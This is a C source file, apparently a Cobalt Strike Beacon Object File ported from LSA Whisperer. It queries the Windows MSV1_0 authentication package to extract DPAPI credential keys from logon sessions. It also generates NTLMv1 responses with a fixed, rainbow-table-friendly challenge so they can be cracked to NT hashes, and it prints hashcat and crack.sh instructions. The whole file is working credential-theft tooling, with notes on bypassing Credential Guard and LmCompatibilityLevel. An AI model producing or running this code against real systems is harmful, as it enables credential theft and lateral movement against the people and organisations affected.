/*
 * msv1_0_bof.c - MSV1_0 Authentication Package BOF
 *
 * Implements:
 *   - GetCredentialKey / GetStrongCredentialKey
 *   - Lm20GetChallengeResponse (NTLMv1)
 *
 * Ported from LSA Whisperer by Evan McBroom / SpecterOps
 */

#include "../common/lsa_common.c"

/* ============================================================
 * GetCredentialKey Implementation
 * ============================================================ */

/*
 * Recover the DPAPI credential key for a logon session.
 * Compatible with Credential Guard.
 */
static void DoGetCredentialKey(LUID targetLuid) {
    HANDLE hLsa = NULL;
    NTSTATUS status, protocolStatus;
    PVOID pResponse = NULL;
    ULONG responseLen = 0;
    BOOL needsTrusted = !IsZeroLUID(&targetLuid);

    BeaconPrintf(CALLBACK_OUTPUT, "[*] MSV1_0 GetCredentialKey");
    if (needsTrusted) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Target LUID: 0x%X:%X",
                     targetLuid.HighPart, targetLuid.LowPart);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Target: Current logon session");
    }
    status = LsaInit(&hLsa, needsTrusted);
    if (!NT_SUCCESS(status)) {
        PrintNTStatus("LsaInit", status);
        return;
    }
    ULONG packageId = 0;
    status = LsaGetPackageId(hLsa, MSV1_0_PACKAGE_NAME, &packageId);
    if (!NT_SUCCESS(status)) {
        PrintNTStatus("LsaLookupAuthenticationPackage(MSV1_0)", status);
        goto cleanup;
    }
    MSV1_0_GETCREDENTIALKEY_REQUEST request;
    MEMSET(&request, 0, sizeof(request));
    request.MessageType = MsV1_0GetCredentialKey;  // 16
    request.LogonId = targetLuid;
    status = LsaCallPackage(
        hLsa, packageId,
        &request, sizeof(request),
        &pResponse, &responseLen,
        &protocolStatus);

    if (!NT_SUCCESS(status)) {
        PrintNTStatus("LsaCallAuthenticationPackage", status);
        goto cleanup;
    }

    if (!NT_SUCCESS(protocolStatus)) {
        PrintNTStatus("MSV1_0 GetCredentialKey protocol", protocolStatus);
        if (protocolStatus == 0xC0000022) { // STATUS_ACCESS_DENIED
            BeaconPrintf(CALLBACK_ERROR,
                "    Need SYSTEM/SeTcbPrivilege to target other sessions");
        } else if (protocolStatus == 0xC000000D) { // STATUS_INVALID_PARAMETER
            BeaconPrintf(CALLBACK_ERROR,
                "    The target session may not have MSV1_0 credential keys.");
            BeaconPrintf(CALLBACK_ERROR,
                "    SYSTEM/service sessions have no password-derived keys.");
            BeaconPrintf(CALLBACK_ERROR,
                "    Target an interactive user session with: lsa-credkey <LUID>");
            BeaconPrintf(CALLBACK_ERROR,
                "    Find valid LUIDs: shell klist sessions");
        } else if (protocolStatus == 0xC00000BB) { // STATUS_NOT_SUPPORTED
            BeaconPrintf(CALLBACK_ERROR,
                "    This Windows build may not support GetCredentialKey");
        }
        goto cleanup;
    }
    if (pResponse && responseLen >= sizeof(MSV1_0_GETCREDENTIALKEY_RESPONSE)) {
        MSV1_0_GETCREDENTIALKEY_RESPONSE* resp = (MSV1_0_GETCREDENTIALKEY_RESPONSE*)pResponse;

        BeaconPrintf(CALLBACK_OUTPUT, "\n[+] SUCCESS - DPAPI Credential Keys recovered!");
        BeaconPrintf(CALLBACK_OUTPUT, "[+] CredSize: 0x%X (%d bytes)", resp->CredSize, resp->CredSize);

        // Local CredKey (SHA OWF)
        HexDump("Local CredKey (SHA OWF)", resp->ShaPassword, MSV1_0_SHA_PASSWORD_LENGTH);
        HexString("Local CredKey", resp->ShaPassword, MSV1_0_SHA_PASSWORD_LENGTH);

        // Domain CredKey - check if it's NT OWF (16 bytes) or full DPAPI key (20 bytes)
        // If bytes 16-19 of Key2 are non-zero, it's a full 20-byte DPAPI "Secure" key
        BOOL isDpapiKey = FALSE;
        {
            PUCHAR check = resp->Key2 + MSV1_0_OWF_PASSWORD_LENGTH;
            if (check[0] || check[1] || check[2] || check[3]) {
                isDpapiKey = TRUE;
            }
        }

        if (isDpapiKey) {
            // Check if domain key equals SHA OWF (means not calculated yet)
            BOOL sameAsLocal = TRUE;
            {
                int i;
                for (i = 0; i < MSV1_0_SHA_PASSWORD_LENGTH; i++) {
                    if (resp->ShaPassword[i] != resp->Key2[i]) { sameAsLocal = FALSE; break; }
                }
            }
            if (sameAsLocal) {
                BeaconPrintf(CALLBACK_OUTPUT,
                    "[*] Domain CredKey: Not calculated yet. Reported as SHA OWF.");
            } else {
                HexDump("Domain CredKey (Secure)", resp->Key2, MSV1_0_CREDENTIAL_KEY_LENGTH);
                HexString("Domain CredKey", resp->Key2, MSV1_0_CREDENTIAL_KEY_LENGTH);
            }
        } else {
            HexDump("Domain CredKey (NT OWF)", resp->Key2, MSV1_0_OWF_PASSWORD_LENGTH);
            HexString("Domain CredKey (NT OWF)", resp->Key2, MSV1_0_OWF_PASSWORD_LENGTH);
        }

        BeaconPrintf(CALLBACK_OUTPUT,
            "\n[*] Use with SharpDPAPI: masterkeys /credkey:<key_hex> /target:<masterkey>");
    } else if (pResponse) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Unexpected response size: %d bytes", responseLen);
        HexDump("Raw Response", (PUCHAR)pResponse, responseLen);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[!] Empty response (len=%d)", responseLen);
    }

cleanup:
    LsaCleanup(hLsa, pResponse);
}

/* ============================================================
 * GetStrongCredentialKey Implementation
 * ============================================================ */

static void DoGetStrongCredentialKey(LUID targetLuid) {
    HANDLE hLsa = NULL;
    NTSTATUS status, protocolStatus;
    PVOID pResponse = NULL;
    ULONG responseLen = 0;
    BOOL needsTrusted = !IsZeroLUID(&targetLuid);

    BeaconPrintf(CALLBACK_OUTPUT, "[*] MSV1_0 GetStrongCredentialKey");
    if (needsTrusted) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Target LUID: 0x%X:%X",
                     targetLuid.HighPart, targetLuid.LowPart);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Target: Current logon session");
    }

    status = LsaInit(&hLsa, needsTrusted);
    if (!NT_SUCCESS(status)) {
        PrintNTStatus("LsaInit", status);
        return;
    }

    ULONG packageId = 0;
    status = LsaGetPackageId(hLsa, MSV1_0_PACKAGE_NAME, &packageId);
    if (!NT_SUCCESS(status)) {
        PrintNTStatus("LsaLookupAuthenticationPackage(MSV1_0)", status);
        goto cleanup;
    }

    MSV1_0_GETSTRONGCREDENTIALKEY_REQUEST request;
    MEMSET(&request, 0, sizeof(request));
    request.MessageType = MsV1_0GetStrongCredentialKey;  // 21
    request.Version = 0;  // Version 0: uses Reserved + LogonId
    request.LogonId = targetLuid;

    status = LsaCallPackage(
        hLsa, packageId,
        &request, sizeof(request),
        &pResponse, &responseLen,
        &protocolStatus);

    if (!NT_SUCCESS(status)) {
        PrintNTStatus("LsaCallAuthenticationPackage", status);
        goto cleanup;
    }

    if (!NT_SUCCESS(protocolStatus)) {
        PrintNTStatus("MSV1_0 GetStrongCredentialKey protocol", protocolStatus);
        goto cleanup;
    }

    // Response uses same format as GetCredentialKey
    if (pResponse && responseLen >= sizeof(MSV1_0_GETCREDENTIALKEY_RESPONSE)) {
        MSV1_0_GETCREDENTIALKEY_RESPONSE* resp = (MSV1_0_GETCREDENTIALKEY_RESPONSE*)pResponse;

        BeaconPrintf(CALLBACK_OUTPUT, "\n[+] SUCCESS - Strong DPAPI Credential Key recovered!");

        // Check if ShaPassword has data
        BOOL hasSha = FALSE;
        { int i; for (i = 0; i < 4; i++) { if (resp->ShaPassword[i]) { hasSha = TRUE; break; } } }

        if (hasSha) {
            HexDump("Local CredKey (SHA OWF)", resp->ShaPassword, MSV1_0_SHA_PASSWORD_LENGTH);
            HexString("Local CredKey", resp->ShaPassword, MSV1_0_SHA_PASSWORD_LENGTH);
        } else {
            HexDump("Domain CredKey (NT OWF/Secure)", resp->Key2, MSV1_0_CREDENTIAL_KEY_LENGTH);
            HexString("Domain CredKey", resp->Key2, MSV1_0_CREDENTIAL_KEY_LENGTH);
        }
    } else if (pResponse) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Unexpected response size: %d bytes", responseLen);
        HexDump("Raw Response", (PUCHAR)pResponse, responseLen);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[!] Empty response (len=%d)", responseLen);
    }

cleanup:
    LsaCleanup(hLsa, pResponse);
}

/* ============================================================
 * Lm20GetChallengeResponse Implementation
 * ============================================================ */

/*
 * Parse hex string to bytes.
 * E.g., "1122334455667788" → {0x11, 0x22, ...}
 */
static BOOL HexStringToBytes(const char* hex, PUCHAR out, ULONG outLen) {
    ULONG hexLen = (ULONG)STRLEN(hex);
    if (hexLen != outLen * 2) return FALSE;

    for (ULONG i = 0; i < outLen; i++) {
        char byte[3] = { hex[i * 2], hex[i * 2 + 1], '\0' };
        out[i] = (UCHAR)MSVCRT$strtoul(byte, NULL, 16);
    }
    return TRUE;
}

/*
 * Generate an NTLMv1 response using a chosen server challenge.
 * Bypasses LmCompatibilityLevel restrictions. Blocked by Credential Guard.
 *
 * Default challenge 1122334455667788 is compatible with crack.sh rainbow tables.
 */
static void DoLm20GetChallengeResponse(LUID targetLuid, const char* challengeHex) {
    HANDLE hLsa = NULL;
    NTSTATUS status, protocolStatus;
    PVOID pResponse = NULL;
    ULONG responseLen = 0;

    BeaconPrintf(CALLBACK_OUTPUT, "[*] MSV1_0 Lm20GetChallengeResponse (NTLMv1 Generation)");

    UCHAR challenge[8] = { 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88 };
    if (challengeHex && challengeHex[0]) {
        if (!HexStringToBytes(challengeHex, challenge, 8)) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Invalid challenge hex. Must be 16 hex chars (8 bytes)");
            BeaconPrintf(CALLBACK_ERROR, "    Example: 1122334455667788");
            return;
        }
    }

    HexString("Server Challenge", challenge, 8);
    if (MEMCMP(challenge, "\x11\x22\x33\x44\x55\x66\x77\x88", 8) == 0) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] Using crack.sh default challenge - response will be FREE to crack!");
    }

    // This always needs a trusted connection to specify a target LUID
    // For NTLMv1 generation, we need to target a specific session
    status = LsaInit(&hLsa, TRUE);
    if (!NT_SUCCESS(status)) {
        PrintNTStatus("LsaInit (trusted required for NTLMv1)", status);
        return;
    }

    ULONG packageId = 0;
    status = LsaGetPackageId(hLsa, MSV1_0_PACKAGE_NAME, &packageId);
    if (!NT_SUCCESS(status)) {
        PrintNTStatus("LsaLookupAuthenticationPackage(MSV1_0)", status);
        goto cleanup;
    }

    /*
     * Build the Lm20GetChallengeResponse request.
     * 
     * The actual request structure uses UNICODE_STRING for the challenge,
     * which points into the buffer itself. We build a self-contained buffer
     * with the challenge embedded.
     */

    /*
     * Build the Lm20GetChallengeResponse request.
     * Real struct: MessageType, ParameterControl, LogonId, Password (UNICODE_STRING), ChallengeToClient[8]
     * Password should be empty (use stored creds from session).
     */
    MSV1_0_LM20_CHALLENGE_RESPONSE_REQ request;
    MEMSET(&request, 0, sizeof(request));
    request.MessageType = MsV1_0Lm20GetChallengeResponse;
    request.ParameterControl = 0;
    request.LogonId = targetLuid;
    // Password: Length=0, MaximumLength=0, Buffer=NULL (use stored credentials)
    // Already zeroed by memset
    MEMCPY(request.ChallengeToClient, challenge, 8);

    // Make the call
    status = LsaCallPackage(
        hLsa, packageId,
        &request, sizeof(request),
        &pResponse, &responseLen,
        &protocolStatus);

    if (!NT_SUCCESS(status)) {
        PrintNTStatus("LsaCallAuthenticationPackage", status);
        goto cleanup;
    }

    if (!NT_SUCCESS(protocolStatus)) {
        PrintNTStatus("MSV1_0 Lm20GetChallengeResponse protocol", protocolStatus);
        if (protocolStatus == 0xC000006D) {
            BeaconPrintf(CALLBACK_ERROR,
                "    STATUS_LOGON_FAILURE - Credential Guard may be blocking NTLMv1 generation");
        }
        goto cleanup;
    }

    // Parse the response
    if (pResponse && responseLen > 0) {
        MSV1_0_LM20_CHALLENGE_RESPONSE_RESP* pResp =
            (MSV1_0_LM20_CHALLENGE_RESPONSE_RESP*)pResponse;

        BeaconPrintf(CALLBACK_OUTPUT, "\n[+] SUCCESS - NTLMv1 Response Generated!");

        // Extract the NT response (CaseSensitiveChallengeResponse)
        if (pResp->CaseSensitiveChallengeResponse.Length > 0) {
            PUCHAR ntResponse = (PUCHAR)pResponse +
                                (ULONG_PTR)pResp->CaseSensitiveChallengeResponse.Buffer;
            ULONG ntRespLen = pResp->CaseSensitiveChallengeResponse.Length;

            HexString("NT Response", ntResponse, ntRespLen);
        }

        // Extract the LM response (CaseInsensitiveChallengeResponse)
        if (pResp->CaseInsensitiveChallengeResponse.Length > 0) {
            PUCHAR lmResponse = (PUCHAR)pResponse +
                                (ULONG_PTR)pResp->CaseInsensitiveChallengeResponse.Buffer;
            ULONG lmRespLen = pResp->CaseInsensitiveChallengeResponse.Length;

            HexString("LM Response", lmResponse, lmRespLen);
        }

        // Print username and domain for hashcat format
        if (pResp->UserName.Length > 0) {
            PrintUnicodeString("UserName", &pResp->UserName);
        }
        if (pResp->LogonDomainName.Length > 0) {
            PrintUnicodeString("Domain", &pResp->LogonDomainName);
        }

        BeaconPrintf(CALLBACK_OUTPUT,
            "\n[*] Hashcat format (mode 5500 - NTLMv1):");
        BeaconPrintf(CALLBACK_OUTPUT,
            "    DOMAIN\\user::HOSTNAME::NTResponse:Challenge");
        BeaconPrintf(CALLBACK_OUTPUT,
            "\n[*] For crack.sh (free, instant with default challenge):");
        BeaconPrintf(CALLBACK_OUTPUT,
            "    https://crack.sh/netntlm/");
        HexString("Challenge Used", challenge, 8);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[!] Empty response");
    }

cleanup:
    LsaCleanup(hLsa, pResponse);
}

/* ============================================================
 * BOF Entry Point
 * ============================================================ */

/*
 * go() - Main BOF entry point
 *
 * Argument format (from aggressor/bof_pack):
 *   arg1: command string ("credkey", "strongcredkey", "ntlmv1")
 *   arg2: LUID string ("0" for current, "0x1234abcd" for specific)
 *   arg3: (ntlmv1 only) challenge hex string
 */
#ifdef BOF
void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);

    char* command = BeaconDataExtract(&parser, NULL);
    char* luidStr = BeaconDataExtract(&parser, NULL);
    char* extra   = BeaconDataExtract(&parser, NULL);

    if (!command || !command[0]) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "=== LSA Whisperer BOF - MSV1_0 Module ===\n"
            "\n"
            "Commands:\n"
            "  credkey [LUID]              - Get DPAPI credential key (works with CG!)\n"
            "  strongcredkey [LUID]        - Get strong DPAPI credential key\n"
            "  ntlmv1 [LUID] [challenge]   - Generate NTLMv1 response (crackable to NT hash)\n"
            "\n"
            "LUID: 0 = current session, 0x1234abcd = specific session\n"
            "Challenge: 16 hex chars (default: 1122334455667788 for crack.sh)\n"
            "\n"
            "Examples:\n"
            "  lsa-msv1_0 credkey\n"
            "  lsa-msv1_0 credkey 0x3e7\n"
            "  lsa-msv1_0 ntlmv1 0x1a2b3c 1122334455667788\n"
        );
        return;
    }

    // Parse LUID
    LUID targetLuid = { 0, 0 };
    if (luidStr && luidStr[0]) {
        ParseLUID(luidStr, &targetLuid);
    }

    // Dispatch to command handler
    if (STRICMP(command, "credkey") == 0) {
        DoGetCredentialKey(targetLuid);
    }
    else if (STRICMP(command, "strongcredkey") == 0) {
        DoGetStrongCredentialKey(targetLuid);
    }
    else if (STRICMP(command, "ntlmv1") == 0) {
        DoLm20GetChallengeResponse(targetLuid, extra);
    }
    else {
        BeaconPrintf(CALLBACK_ERROR, "[!] Unknown command: %s", command);
        BeaconPrintf(CALLBACK_ERROR, "    Valid: credkey, strongcredkey, ntlmv1");
    }
}
#endif
